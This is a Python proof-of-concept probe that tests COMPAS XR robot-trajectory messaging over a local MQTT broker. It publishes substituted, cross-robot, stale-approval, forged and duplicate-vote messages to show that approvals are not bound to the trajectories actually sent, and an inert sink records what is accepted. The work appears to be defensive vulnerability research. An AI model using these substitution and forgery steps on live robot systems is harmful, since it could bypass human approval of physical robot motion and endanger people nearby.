#!/opt/compas-venv/bin/python
"""Local MQTT/schema probe for the fixed COMPAS XR source snapshot.

The sink is intentionally inert: reaching it means only that the official
COMPAS Eve transport and SendTrajectory parser accepted the handoff.  This
probe never connects to a robot controller or a public broker.
"""

from __future__ import annotations

import hashlib
import json
import os
import sys
import threading
import time
from typing import Any, Callable

import paho.mqtt.client as mqtt
from compas_eve import Publisher, Subscriber, Topic
from compas_eve.mqtt import MqttTransport
from compas_xr.mqtt.messages import (
    ApprovalCounterResult,
    ApproveTrajectory,
    Header,
    SendTrajectory,
)


BROKER = "127.0.0.1"
PORT = 1883
PROJECT = "authorization_probe"
SEND_TOPIC = f"compas_xr/send_trajectory/{PROJECT}"
APPROVE_TOPIC = f"compas_xr/approve_trajectory/{PROJECT}"
COUNTER_TOPIC = f"compas_xr/approval_counter_result/{PROJECT}"
ELEMENT = "assembly-step-7"
ROBOT = "ur10e-local-probe"
ROBOT_B = "ur3-cross-robot-probe"


def enable_broker_credentials() -> dict[str, Any]:
    """Inject credentials before compas_eve's eager MQTT connect.

    COMPAS EVE 2.1.1 creates and connects its paho client inside the
    constructor and has no username/password parameter.  Patching paho's
    connect entry point keeps the official COMPAS transport and codec while
    ensuring every local client authenticates before the TCP connection.
    """

    username = os.environ.get("COMPAS_MQTT_USERNAME")
    password = os.environ.get("COMPAS_MQTT_PASSWORD")
    if not username or not password:
        return {"enabled": False, "reason": "credential environment absent"}
    original_connect = mqtt.Client.connect

    def credentialed_connect(client: mqtt.Client, *args: Any, **kwargs: Any) -> Any:
        client.username_pw_set(username, password)
        return original_connect(client, *args, **kwargs)

    mqtt.Client.connect = credentialed_connect
    return {
        "enabled": True,
        "principal": username,
        "password_recorded": False,
        "transport": "official compas_eve MqttTransport with pre-connect paho credential injection",
    }


def wait_for(predicate: Callable[[], bool], timeout: float, description: str) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if predicate():
            return
        time.sleep(0.03)
    raise RuntimeError(f"timeout waiting for {description}")


def digest_trajectory(trajectory: dict[str, Any]) -> str:
    canonical = json.dumps(trajectory, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(canonical.encode()).hexdigest()


def make_header(sequence: int, response: int, device: str, stamp: str) -> Header:
    return Header(
        sequence_id=sequence,
        response_id=response,
        device_id=device,
        time_stamp=stamp,
    )


def close_transport(transport: MqttTransport) -> None:
    try:
        transport.client.disconnect()
    finally:
        transport.close()


class InertExecutionSink:
    """Records official SendTrajectory objects without commanding hardware."""

    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.received: list[dict[str, Any]] = []

    def callback(self, message: SendTrajectory) -> None:
        with self.lock:
            self.received.append(
                {
                    "element_id": message.element_id,
                    "robot_name": message.robot_name,
                    "trajectory_id": message.trajectory_id,
                    "trajectory": message.trajectory,
                    "decoded_header": {
                        "sequence_id": message.header.sequence_id,
                        "response_id": message.header.response_id,
                        "device_id": message.header.device_id,
                        "time_stamp": message.header.time_stamp,
                    },
                }
            )

    def snapshot(self) -> list[dict[str, Any]]:
        with self.lock:
            return list(self.received)


class UnitySourceLogicModel:
    """Minimal state transitions mirrored from current Unity handlers.

    This is explicitly a source-faithful model, not execution of the Unity
    binary.  The current handlers increment once per received message and do
    not keep a set of device IDs or approved trajectory digests.
    """

    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.user_count = 0
        self.approval_count = 0
        self.approval_devices: list[str] = []
        self.counter_devices: list[str] = []

    def approval_callback(self, message: ApproveTrajectory) -> None:
        if message.approval_status != 1:
            return
        with self.lock:
            self.approval_count += 1
            self.approval_devices.append(str(message.header.device_id))

    def counter_callback(self, message: ApprovalCounterResult) -> None:
        with self.lock:
            self.user_count += 1
            self.counter_devices.append(str(message.header.device_id))

    def snapshot(self) -> dict[str, Any]:
        with self.lock:
            return {
                "user_count": self.user_count,
                "approval_count": self.approval_count,
                "approval_devices": list(self.approval_devices),
                "counter_devices": list(self.counter_devices),
            }


def main() -> int:
    trajectory_a = {
        "joint_1": [0.10, 0.20, 0.30],
        "joint_2": [0.00, 0.10, 0.20],
    }
    trajectory_b = {
        "joint_1": [1.10, 1.20, 1.30],
        "joint_2": [0.90, 1.00, 1.10],
    }
    results: dict[str, Any] = {"broker_authentication": enable_broker_credentials()}
    transports: list[MqttTransport] = []
    subscribers: list[Subscriber] = []

    try:
        sink = InertExecutionSink()
        unity_model = UnitySourceLogicModel()

        sink_transport = MqttTransport(BROKER, PORT, client_id="compas-probe-sink")
        approval_transport = MqttTransport(BROKER, PORT, client_id="compas-probe-approval-model")
        counter_transport = MqttTransport(BROKER, PORT, client_id="compas-probe-counter-model")
        transports.extend([sink_transport, approval_transport, counter_transport])

        sink_subscriber = Subscriber(
            Topic(SEND_TOPIC, SendTrajectory),
            callback=sink.callback,
            transport=sink_transport,
        )
        approval_subscriber = Subscriber(
            Topic(APPROVE_TOPIC, ApproveTrajectory),
            callback=unity_model.approval_callback,
            transport=approval_transport,
        )
        counter_subscriber = Subscriber(
            Topic(COUNTER_TOPIC, ApprovalCounterResult),
            callback=unity_model.counter_callback,
            transport=counter_transport,
        )
        subscribers.extend([sink_subscriber, approval_subscriber, counter_subscriber])
        for subscriber in subscribers:
            subscriber.subscribe()
        time.sleep(0.5)

        approvals_a = [
            ApproveTrajectory(
                ELEMENT,
                ROBOT,
                trajectory_a,
                1,
                header=make_header(101 + index, 501, device, f"stamp-approval-{device}"),
            )
            for index, device in enumerate(("honest-device-A", "honest-device-B", "honest-device-C"))
        ]
        approval_a = approvals_a[0]
        send_a = SendTrajectory(
            ELEMENT,
            ROBOT,
            trajectory_a,
            header=make_header(102, 501, "device-A", "stamp-send-A"),
        )
        send_b = SendTrajectory(
            ELEMENT,
            trajectory=trajectory_b,
            robot_name=ROBOT,
            header=make_header(103, 501, "device-B", "stamp-send-B"),
        )

        results["schema_binding"] = {
            "trajectory_a_sha256": digest_trajectory(trajectory_a),
            "trajectory_b_sha256": digest_trajectory(trajectory_b),
            "digests_differ": digest_trajectory(trajectory_a) != digest_trajectory(trajectory_b),
            "approval_trajectory_id": approval_a.trajectory_id,
            "send_a_trajectory_id": send_a.trajectory_id,
            "send_b_trajectory_id": send_b.trajectory_id,
            "different_content_same_trajectory_id": (
                send_a.trajectory_id == send_b.trajectory_id
                and digest_trajectory(trajectory_a) != digest_trajectory(trajectory_b)
            ),
            "send_trajectory_fields": sorted(send_a.data.keys()),
            "approval_evidence_in_send": any(
                field in send_a.data
                for field in ("approval", "approval_status", "approved_digest", "approvers")
            ),
        }

        # Normal official transport path: approval of A followed by handoff of A.
        legit_transport = MqttTransport(BROKER, PORT, client_id="compas-probe-legit-device")
        transports.append(legit_transport)
        approval_publisher = Publisher(
            Topic(APPROVE_TOPIC, ApproveTrajectory), transport=legit_transport
        )
        send_publisher = Publisher(Topic(SEND_TOPIC, SendTrajectory), transport=legit_transport)
        for approval in approvals_a:
            approval_publisher.publish(approval)
        send_publisher.publish(send_a)
        wait_for(lambda: len(sink.snapshot()) >= 1, 3.0, "normal trajectory A handoff")
        wait_for(lambda: unity_model.snapshot()["approval_count"] >= 3, 3.0, "three honest approvals")
        normal_received = sink.snapshot()[0]
        results["normal_handoff"] = {
            "trajectory_received": normal_received["trajectory"] == trajectory_a,
            "trajectory_id": normal_received["trajectory_id"],
            "approver_identities_claimed_in_headers": [
                "honest-device-A",
                "honest-device-B",
                "honest-device-C",
            ],
            "approver_identity_authentication": "UNCONFIRMED_SELF_ASSERTED_DEVICE_HEADER",
            "sink_scope": "inert local audit sink; no robot executor",
        }

        # Approval A remains unchanged, but the same producer can hand off B
        # under the identical element-derived trajectory_id.
        send_publisher.publish(send_b)
        wait_for(lambda: len(sink.snapshot()) >= 2, 3.0, "T_A approval then T_B handoff")
        substitution_received = sink.snapshot()[1]
        results["approval_to_execution_substitution"] = {
            "attack_ids": ["A1_MUTABLE_CURRENT_TRAJECTORY", "A2_SAME_ID_DIFFERENT_CONTENT"],
            "approved_digest": digest_trajectory(trajectory_a),
            "received_digest": digest_trajectory(substitution_received["trajectory"]),
            "same_trajectory_id": substitution_received["trajectory_id"] == approval_a.trajectory_id,
            "T_B_reached_official_send_subscriber": substitution_received["trajectory"] == trajectory_b,
            "automatic_equality_or_digest_rejection": False,
            "final_classification": "ACCEPTED_BY_OFFICIAL_HANDOFF_NO_ROBOT_COMMAND",
        }

        # A3: the public SendTrajectory schema accepts a different robot name
        # under the same element-derived trajectory ID.  The official sink
        # receives it, but there is no shipped robot executor to command.
        cross_robot = SendTrajectory(
            ELEMENT,
            ROBOT_B,
            trajectory_b,
            header=make_header(104, 501, "primary-device", "stamp-cross-robot"),
        )
        send_publisher.publish(cross_robot)
        wait_for(lambda: len(sink.snapshot()) >= 3, 3.0, "cross-robot handoff")
        cross_received = sink.snapshot()[2]
        results["cross_robot_substitution"] = {
            "attack_id": "A3_CROSS_ROBOT_SUBSTITUTION",
            "approved_robot": ROBOT,
            "received_robot": cross_received["robot_name"],
            "same_trajectory_id": cross_received["trajectory_id"] == approval_a.trajectory_id,
            "accepted_by_official_send_subscriber": cross_received["robot_name"] == ROBOT_B,
            "final_classification": "ACCEPTED_BY_OFFICIAL_HANDOFF_NO_ROBOT_COMMAND",
        }

        # A4: publish the official consensus marker, then reuse the old
        # response/trajectory identity for different content.  SendTrajectory
        # contains no approval proof or epoch for the subscriber to validate.
        consensus = ApproveTrajectory(
            ELEMENT,
            ROBOT,
            trajectory_a,
            2,
            header=make_header(105, 501, "primary-device", "stamp-consensus-A"),
        )
        approval_publisher.publish(consensus)
        stale_send = SendTrajectory(
            ELEMENT,
            ROBOT,
            trajectory_b,
            header=make_header(106, 501, "primary-device", "stamp-stale-approval"),
        )
        send_publisher.publish(stale_send)
        wait_for(lambda: len(sink.snapshot()) >= 4, 3.0, "stale approval handoff")
        stale_received = sink.snapshot()[3]
        results["stale_approval_reuse"] = {
            "attack_id": "A4_STALE_APPROVAL_REUSE",
            "approved_digest": digest_trajectory(trajectory_a),
            "received_digest": digest_trajectory(stale_received["trajectory"]),
            "response_id_reused": True,
            "approval_epoch_field_available": False,
            "accepted_by_official_send_subscriber": stale_received["trajectory"] == trajectory_b,
            "final_classification": "ACCEPTED_BY_OFFICIAL_HANDOFF_NO_ROBOT_COMMAND",
        }

        # Reference negative control: this is a test oracle, not a COMPAS XR
        # feature.  It binds the canonical digest, robot, transaction epoch and
        # exact approver set at the executor boundary.
        approved_grant = {
            "element_id": ELEMENT,
            "robot_name": ROBOT,
            "trajectory_digest": digest_trajectory(trajectory_a),
            "approval_epoch": 501,
            "approvers": ["honest-device-A", "honest-device-B", "honest-device-C"],
        }

        def reference_allows(
            message: SendTrajectory,
            epoch: int,
            approvers: list[str],
        ) -> dict[str, Any]:
            checks = {
                "element": message.element_id == approved_grant["element_id"],
                "robot": message.robot_name == approved_grant["robot_name"],
                "digest": digest_trajectory(message.trajectory)
                == approved_grant["trajectory_digest"],
                "epoch": epoch == approved_grant["approval_epoch"],
                "approvers": sorted(approvers) == sorted(approved_grant["approvers"]),
            }
            return {"allowed": all(checks.values()), "checks": checks}

        results["reference_negative_control"] = {
            "classification": "TEST_ONLY_REFERENCE_EXECUTOR_NOT_COMPAS_FEATURE",
            "normal_a": reference_allows(send_a, 501, approved_grant["approvers"]),
            "same_id_t_b": reference_allows(send_b, 501, approved_grant["approvers"]),
            "cross_robot_t_b": reference_allows(cross_robot, 501, approved_grant["approvers"]),
            "stale_epoch_t_b": reference_allows(stale_send, 500, approved_grant["approvers"]),
        }

        # End the original producer and reconnect as a different MQTT client.
        close_transport(legit_transport)
        transports.remove(legit_transport)
        reconnect_transport = MqttTransport(BROKER, PORT, client_id="compas-probe-reconnected-device")
        transports.append(reconnect_transport)
        reconnect_publisher = Publisher(
            Topic(SEND_TOPIC, SendTrajectory), transport=reconnect_transport
        )
        forged_after_disconnect = SendTrajectory(
            ELEMENT,
            ROBOT,
            trajectory_b,
            header=make_header(999, 501, "forged-device", "stamp-forged-reconnect"),
        )
        reconnect_publisher.publish(forged_after_disconnect)
        wait_for(lambda: len(sink.snapshot()) >= 5, 3.0, "reconnected producer handoff")
        results["producer_disconnect_reconnect"] = {
            "new_client_handoff_received": sink.snapshot()[4]["trajectory"] == trajectory_b,
            "prior_approval_proof_required_by_send_schema": False,
            "note": (
                "the reconnecting MQTT client used the same authenticated broker credential; "
                "this demonstrates missing approval-to-send binding, not a cross-principal scope bypass"
            ),
        }

        # Repeated votes with the same encoded device are delivered repeatedly.
        duplicate_transport = MqttTransport(BROKER, PORT, client_id="compas-probe-duplicate-votes")
        transports.append(duplicate_transport)
        duplicate_approval_publisher = Publisher(
            Topic(APPROVE_TOPIC, ApproveTrajectory), transport=duplicate_transport
        )
        duplicate_counter_publisher = Publisher(
            Topic(COUNTER_TOPIC, ApprovalCounterResult), transport=duplicate_transport
        )
        duplicate_approval = ApproveTrajectory(
            ELEMENT,
            ROBOT,
            trajectory_a,
            1,
            header=make_header(201, 601, "same-device", "same-approval-stamp"),
        )
        duplicate_counter = ApprovalCounterResult(
            ELEMENT,
            header=make_header(202, 601, "same-device", "same-counter-stamp"),
        )
        counts_before = unity_model.snapshot()
        duplicate_approval_publisher.publish(duplicate_approval)
        duplicate_approval_publisher.publish(duplicate_approval)
        duplicate_counter_publisher.publish(duplicate_counter)
        duplicate_counter_publisher.publish(duplicate_counter)
        wait_for(
            lambda: unity_model.snapshot()["approval_count"] >= counts_before["approval_count"] + 2,
            3.0,
            "duplicate approval delivery",
        )
        wait_for(
            lambda: unity_model.snapshot()["user_count"] >= counts_before["user_count"] + 2,
            3.0,
            "duplicate counter delivery",
        )
        counts_after = unity_model.snapshot()
        new_approval_devices = counts_after["approval_devices"][len(counts_before["approval_devices"]) :]
        new_counter_devices = counts_after["counter_devices"][len(counts_before["counter_devices"]) :]
        results["duplicate_vote_source_logic_model"] = {
            "classification": "official MQTT messages plus source-faithful Unity state model; not Unity binary runtime",
            "approval_count_delta": counts_after["approval_count"] - counts_before["approval_count"],
            "user_count_delta": counts_after["user_count"] - counts_before["user_count"],
            "unique_decoded_approval_devices": len(set(new_approval_devices)),
            "unique_decoded_counter_devices": len(set(new_counter_devices)),
            "deduplication_applied": False,
        }

        # Exercise the current Python decoder explicitly.  Header.parse passes
        # positional fields in the wrong constructor order, so identity fields
        # are not preserved even on a normal official transport round trip.
        decoded_normal_header = normal_received["decoded_header"]
        results["python_header_round_trip"] = {
            "encoded": {
                "sequence_id": 102,
                "response_id": 501,
                "device_id": "device-A",
                "time_stamp": "stamp-send-A",
            },
            "decoded": decoded_normal_header,
            "identity_preserved": decoded_normal_header.get("device_id") == "device-A",
        }

        required = [
            results["schema_binding"]["different_content_same_trajectory_id"],
            not results["schema_binding"]["approval_evidence_in_send"],
            results["normal_handoff"]["trajectory_received"],
            results["approval_to_execution_substitution"]["T_B_reached_official_send_subscriber"],
            results["cross_robot_substitution"]["accepted_by_official_send_subscriber"],
            results["stale_approval_reuse"]["accepted_by_official_send_subscriber"],
            results["reference_negative_control"]["normal_a"]["allowed"],
            not results["reference_negative_control"]["same_id_t_b"]["allowed"],
            not results["reference_negative_control"]["cross_robot_t_b"]["allowed"],
            not results["reference_negative_control"]["stale_epoch_t_b"]["allowed"],
            results["producer_disconnect_reconnect"]["new_client_handoff_received"],
            results["duplicate_vote_source_logic_model"]["approval_count_delta"] == 2,
            results["duplicate_vote_source_logic_model"]["user_count_delta"] == 2,
            not results["python_header_round_trip"]["identity_preserved"],
        ]
        results["probe_pass"] = all(required)
        results["received_handoffs"] = sink.snapshot()
        print(json.dumps(results, indent=2, sort_keys=True))
        return 0 if results["probe_pass"] else 2
    except Exception as exc:
        results["probe_pass"] = False
        results["error"] = f"{type(exc).__name__}: {exc}"
        print(json.dumps(results, indent=2, sort_keys=True))
        return 1
    finally:
        for subscriber in subscribers:
            try:
                subscriber.unsubscribe()
            except Exception:
                pass
        for transport in transports:
            try:
                close_transport(transport)
            except Exception:
                pass


if __name__ == "__main__":
    sys.exit(main())
